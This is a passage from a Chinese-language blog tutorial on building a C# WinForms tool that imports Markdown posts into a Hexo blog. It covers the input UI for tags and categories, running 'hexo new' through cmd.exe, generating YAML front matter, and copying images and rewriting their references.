class="built_in">string</span> fileContent = <span class="keyword">await</span> Task.Run(() =&gt; File.ReadAllText(filePath, Encoding.UTF8));     <span class="comment">// 异步读取 Markdown 文件内容</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">            StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">            frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 tags</span></span><br><span class="line">            <span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 添加 categories</span></span><br><span class="line">            <span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">                <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">                &#123;</span><br><span class="line">                    frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line">            <span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">            MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">                <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">                imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">                imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">                <span class="comment">// 提取图片文件名</span></span><br><span class="line">                <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">                <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">                        <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">                        <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">                        </span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">                        <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">                        fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">                    &#123;</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    AppendMessage(<span class="string">$&quot;[-] Image not found: <span class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">                    <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将内容合并</span></span><br><span class="line">            <span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line">            <span class="comment">// 写入文件</span></span><br><span class="line">            <span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h5
id="获取tagscategories等相关信息ui">获取tags、categories等相关信息UI</h5>
<p>主要也是用<strong>TableLayoutPanel</strong>进行页面设计，这里我们先改一下Form1.cs，让点击File的菜单栏后不是只有弹文件选择，而是先利用之前实现的<strong>AddTab</strong>来创建一个<strong>TabPage</strong>，然后再调用<strong>FileProcessor.cs</strong>中的<strong>CreateProcessMarkdownPanel</strong>方法来返回文件处理的面板。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddTab(<span class="string">&quot;File&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (tabName)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">        <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">        <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置对话框的描述</span></span><br><span class="line">            fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">            fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">            <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                selectedFilePath = fileDialog.FileName;</span><br><span class="line">              </span><br><span class="line">                <span class="comment">// 处理选中的文件</span></span><br><span class="line">                FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">                newTab.Controls.Add(processor.CreateProcessMarkdownPanel(selectedFilePath));</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>每一行的设计也有区别，首先文章标题的输入可以直接使用TextBox文本框获取。而tags和categories由于可以存在多个，可行的方案之一是也用TextBox读取，然后指定某个分隔符来分开多个不同的tag和category。但这样显然比较麻烦，所以我们可以使用<strong>FlowLayoutPanel</strong>来进行动态的布局设计，目标是可以创建一系列不同的TextBox输入框，点击+按钮新建一个tag输入框，点击-按钮删除一个tag输入框。该布局模板可以动态的根据屏幕大小进行适应，比如可以自动换行，相当方便。+-按钮都要绑定一个点击事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">&#123;</span><br><span class="line">    Dock = DockStyle.Top,</span><br><span class="line">    AutoSize = <span class="literal">true</span>,</span><br><span class="line">    FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">    WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">    Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 创建加号按钮</span></span><br><span class="line">addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建减号按钮</span></span><br><span class="line">removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line"><span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">........................................................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后就是核心的<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数实现。需要注意的是边界条件的处理，我们在只有一个输入框时可以不显示<code>-</code>按钮，以防止越界。而且如果直接往<strong>inputPanel</strong>(也就是调用者的<strong>tagsPanel</strong>)中加TextBox，会导致<code>+-</code>不显示在所有输入框之后，比较不美观。所以我们可以每次增加输入框时，先删去原来的<code>+-</code>按钮，待TextBox增加入控件后，最后再次添加按钮回来。这样就能确保按钮位置正确。这里抽象出了<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数是为了tag和category的处理都能够复用。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">    TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">        Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">    textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">    <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">        inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">    inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">    inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">        inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">        TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">        <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">            textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">            inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127234914952.png"
                      class=""
                >
<p>获取用户输入的Tags和Category也比较方便。能够直接返回一个string类型的数组。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">        &#123;</span><br><span class="line">            tags.Add(textBox.Text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后可以添加一个提交按钮，来触发核心的文件处理函数。按钮点击后就可以隐藏，避免多次点击。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建确定按钮</span></span><br><span class="line">Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">    Width = <span class="number">100</span>,</span><br><span class="line">    Height = <span class="number">40</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">    <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非空检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
<h5 id="消息窗口实现"><strong>消息窗口实现</strong></h5>
<p>实现了上述的UI以后，界面还是有点空旷，那么其实我们可以把一些执行中的过程信息显示出来，来丰富界面，实现如下：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 Process 信息框</span></span><br><span class="line">processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">&#123;</span><br><span class="line">    Multiline = <span class="literal">true</span>,</span><br><span class="line">    Width = <span class="number">600</span>,</span><br><span class="line">    Height = <span class="number">200</span>,</span><br><span class="line">    ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">    ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">    WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">    Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">&#125;;</span><br><span class="line">.......................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">    processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">    processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">    processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>之后我们调用<strong>AppendMessage</strong>就可以直接把消息显示到屏幕上了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250128001534976.png"
                      class=""
                >
<h5 id="文件具体处理实现">文件具体处理实现</h5>
<p>首先是要利用hexo的new命令来新建一个文章的架构，比较麻烦的是切换到Hexo的目录。首先我们要先从设置中读取出来，然后得截取出盘符，因为在windows上不能直接跨盘符用cd切换目录。最后才能执行<code>hexo new title</code>。这里用异步函数是为了在消息框显示内容更有层次感。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">     settings.LoadSettings();</span><br><span class="line">     <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">     <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">     <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">     <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">     AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">     <span class="keyword">try</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">         ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">         &#123;</span><br><span class="line">             FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">             Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">             CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">             UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">             RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">             RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">             <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line"></span><br><span class="line">             process.WaitForExit();</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">             &#123;</span><br><span class="line">                 MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                 AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                 <span class="keyword">return</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                 AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">     &#123;</span><br><span class="line">         MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>
<p>然后是根据提供的几个参数来构建hexo的文章的YAML前言部分。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 tags</span></span><br><span class="line"><span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 categories</span></span><br><span class="line"><span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br></pre></td></tr></table></figure></div>
<p>最后就是将所有markdown文件中出现的图片通过正则匹配提取路径，并复制到指定目录，然后将图片语法替换成hexo能够解析的语法。最后将内容合并，写回hexo文章的markdown文件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line"><span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">    <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">    imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">    imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">    <span class="comment">// 提取图片文件名</span></span><br><span class="line">    <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">            <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">            </span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">            <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">            fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        AppendMessage(<span class="string">$&quot;[-] Image not found: <span 